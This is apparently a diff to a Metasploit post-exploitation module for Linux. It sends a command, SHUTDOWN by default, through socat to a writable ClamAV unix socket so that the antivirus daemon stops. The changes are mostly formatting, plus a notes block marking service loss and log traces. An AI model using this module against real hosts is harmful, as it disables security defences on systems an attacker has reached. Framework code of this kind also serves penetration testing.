@@ -8,7 +8,6 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-
   def initialize(info = {})
     super(
       update_info(
@@ -23,35 +22,39 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'linux' ],
         'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
       )
     )
     register_options(
       [
-        OptString.new("CLAMAV_UNIX_SOCKET", [true, "ClamAV unix socket", "/run/clamav/clamd.ctl" ]),
-        OptString.new("COMMAND", [true, "ClamAV command to execute", "SHUTDOWN" ])
+        OptString.new('CLAMAV_UNIX_SOCKET', [true, 'ClamAV unix socket', '/run/clamav/clamd.ctl' ]),
+        OptString.new('COMMAND', [true, 'ClamAV command to execute', 'SHUTDOWN' ])
       ], self.class
     )
   end
 
-
- def run
+  def run
     clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
-		cmd = datastore['COMMAND']
+    cmd = datastore['COMMAND']
 
-    if command_exists?("socat")
-      print_good("socat exists") 
+    if command_exists?('socat')
+      print_good('socat exists')
     else
-      print_bad("socat does not exist on target host. Quitting!")
+      print_bad('socat does not exist on target host. Quitting!')
       return
     end
 
     print_status("Checking file path #{clamav_socket} exists and is writable... ")
-		if writable?("#{clamav_socket}")
-			print_good("File does exist and is writable!")
-			print_good("Sending #{cmd}...")
+    if writable?(clamav_socket.to_s)
+      print_good('File does exist and is writable!')
+      print_good("Sending #{cmd}...")
       cmd_exec("echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}")
     else
-			print_bad("File does NOT exist or is not writable!")
-	 end
+      print_bad('File does NOT exist or is not writable!')
+    end
   end
 end
